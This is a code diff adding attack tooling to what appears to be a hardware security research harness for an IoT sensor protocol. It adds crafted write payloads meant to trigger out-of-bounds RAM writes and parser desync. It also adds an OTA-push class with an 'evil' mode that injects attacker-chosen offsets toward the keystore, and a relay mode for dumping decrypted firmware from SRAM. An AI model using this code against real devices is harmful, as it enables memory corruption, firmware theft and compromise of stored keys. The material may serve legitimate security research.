@@ -388,3 +388,156 @@ class PropertySweep:
             "responded": len(self.responses),
             "findings": len(self.findings),
         }
+
+
+# =====================================================================
+# Write-path fuzzing + OTA push (2026-07-23)
+# The read/disclosure surface is exhausted (see property_request memory).
+# These drive the WRITE vectors, made observable by the SWD crash oracle
+# (tools/sensor_swd/crash_oracle.sh reads CFSR/HFSR/BFAR after a batch).
+# =====================================================================
+
+def build_write_corpus() -> list:
+    """Crafted PROPERTY_SET write vectors (Vectors 1 & 3). Wire format:
+    `[0x0e][tag] { [id][channel][value…] }` — value is fixed-size per the
+    device's valueSize map, or dynamic `[len][value]`. Each case is
+    `[msgId][tag=0][payload]`; the harness patches byte 1 with a live tag.
+
+    Vector 1 (OOB channel index): `channel` is the byte after `id`. Every prior
+    corpus case hardcoded channel=0x00; here we drive it out of range. If the
+    firmware does `channel_state[channel] = value` with no bound, an OOB channel
+    is an OOB RAM write. Prop 0x12 (18) advertised channelCount=2 on this device.
+
+    Vector 3 (multi-entry parser desync): one PROPERTY_SET carrying several
+    entries where an early entry's declared dynamic length walks the cursor into
+    later attacker bytes.
+
+    Ordered least→most aggressive. These are WRITES — pair with SWD.
+    """
+    T = 0x00
+    cases: list[tuple[str, bytes]] = []
+
+    def add(name, body):
+        cases.append((name, bytes(body)))
+
+    # --- Vector 1: OOB channel index ---------------------------------------
+    # channelCount=2 means valid channels are {0,1}; 0x02 is the first invalid
+    # index, escalating to 0xFF. Target 0x12 (advertised chan=2) + a few config
+    # properties that plausibly index per-channel state.
+    for pid in (0x12, 0x10, 0x08, 0x18, 0x0c, 0x0a):
+        for ch in (0x02, 0x08, 0x40, 0xC8, 0xFF):
+            add(f"chan-oob id=0x{pid:02x} ch=0x{ch:02x}",
+                [0x0e, T, pid, ch, 0xDE, 0xAD, 0xBE, 0xEF])
+
+    # --- Vector 3: multi-entry PROPERTY_SET parser desync -------------------
+    # Entry 1 declares a large dynamic len but supplies few bytes, so the parser
+    # cursor runs past real data into the following (attacker-chosen) bytes.
+    add("multi-desync-biglen",
+        [0x0e, T, 0x0d, 0x00, 0x40, 0xAA, 0xBB, 0x0d, 0x00, 0x04, 0x11, 0x22, 0x33, 0x44])
+    add("multi-desync-chain",
+        [0x0e, T, 0x2a, 0x00, 0xF0] + [0x2a, 0x00, 0x01] * 3)
+    add("multi-desync-oob-ch",
+        [0x0e, T, 0x12, 0xC8, 0x08, 0xDE, 0xAD, 0x12, 0x00, 0x01, 0x99])
+    return cases
+
+
+class OtaPush:
+    """Drive the sensor's firmware-OTA state machine from the controller side.
+
+    Per docs/protocol/ota_update_protocol.md: send FIRMWARE_UPDATE_START{size}
+    to enter OTA mode, then answer each sensor FIRMWARE_CHUNK_REQUEST
+    {size, offset, status} with FIRMWARE_CHUNK_RESPONSE{offset, chunk}.
+
+    Two modes:
+      relay (ota_bytes set, evil_offset None) — serve real .ota bytes faithfully.
+        Legit push: the bootloader decrypts→flashes, so plaintext firmware
+        transits SRAM. Hammer-SWD-dump during the transfer to catch it. Optional
+        `pause_at` stalls the transfer once the sensor requests offset>=pause_at
+        so you can dump at a known state.
+      evil (evil_offset set) — after entering OTA mode, answer with an
+        attacker-chosen offset (NOT the requested one) + a DEADBEEF marker chunk.
+        Vector 2 OOB-write probe: SWD-diff the SRAM to locate where the marker
+        landed and whether `offset` steers the write toward the keystore.
+    """
+    sustain_on_any = True
+    MARKER = b"\xde\xad\xbe\xef"
+
+    def __init__(self, ota_bytes: bytes | None = None,
+                 total_size: int | None = None,
+                 evil_offset: int | None = None,
+                 evil_len: int = 64,
+                 pause_at: int | None = None):
+        self.ota = ota_bytes
+        self.size = total_size if total_size is not None else (
+            len(ota_bytes) if ota_bytes else 0)
+        self.evil_offset = evil_offset
+        self.evil_len = evil_len
+        self.pause_at = pause_at
+        self._started = False
+        self._pending: tuple[int, int] | None = None
+        self._evil_sent = False
+        self._served = 0
+        self._rounds = 0
+        self._last_req = None
+        self.completed = False
+        self.aborted = False
+        self.findings: list[dict] = []
+
+    def next_probe(self, tag: int) -> bytes | None:
+        t = tag & 0xFF
+        # 1. Enter OTA mode (once).
+        if not self._started:
+            self._started = True
+            return bytes([0x0f, t]) + self.size.to_bytes(4, "big")
+        # 2. Vector 2: inject the malicious chunk once, right after OTA mode.
+        if self.evil_offset is not None and not self._evil_sent:
+            self._evil_sent = True
+            chunk = (self.MARKER * ((self.evil_len // 4) + 1))[:self.evil_len]
+            self.findings.append({"vector": "ota-offset-oob",
+                                  "evil_offset": self.evil_offset,
+                                  "marker": chunk[:8].hex()})
+            return bytes([0x11, t]) + self.evil_offset.to_bytes(4, "big") + chunk
+        # 3. Relay: serve the pending request faithfully.
+        if self._pending is not None:
+            off, sz = self._pending
+            self._pending = None
+            if self.pause_at is not None and off >= self.pause_at:
+                self.findings.append({"paused_at_request": off})
+                return None
+            chunk = self.ota[off:off + sz] if self.ota else b"\x00" * sz
+            self._served = max(self._served, off + len(chunk))
+            self._rounds += 1
+            return bytes([0x11, t]) + off.to_bytes(4, "big") + bytes(chunk)
+        return None   # nothing pending -> gateway sends a PING keep-alive
+
+    def ingest(self, payload: bytes) -> None:
+        # FIRMWARE_CHUNK_REQUEST = [0x10][tag][size:4BE][offset:4BE][status]
+        if not payload or payload[0] != 0x10 or len(payload) < 11:
+            return
+        size = int.from_bytes(payload[2:6], "big")
+        offset = int.from_bytes(payload[6:10], "big")
+        status = payload[10]
+        self._last_req = {"size": size, "offset": offset, "status": status}
+        if status == 2:
+            self.completed = True
+        elif status == 1:
+            self.aborted = True
+            self.findings.append({"sensor_error": self._last_req})
+        else:
+            self._pending = (offset, size)
+
+    def done(self) -> bool:
+        if self.completed or self.aborted:
+            return True
+        # evil mode: stop once we've injected AND seen the sensor react
+        if (self.evil_offset is not None and self._evil_sent
+                and self._last_req is not None):
+            return True
+        return False
+
+    def summary(self) -> dict:
+        return {"started": self._started, "rounds": self._rounds,
+                "served_bytes": self._served, "size": self.size,
+                "completed": self.completed, "aborted": self.aborted,
+                "last_req": self._last_req, "evil_offset": self.evil_offset,
+                "evil_sent": self._evil_sent, "findings": len(self.findings)}
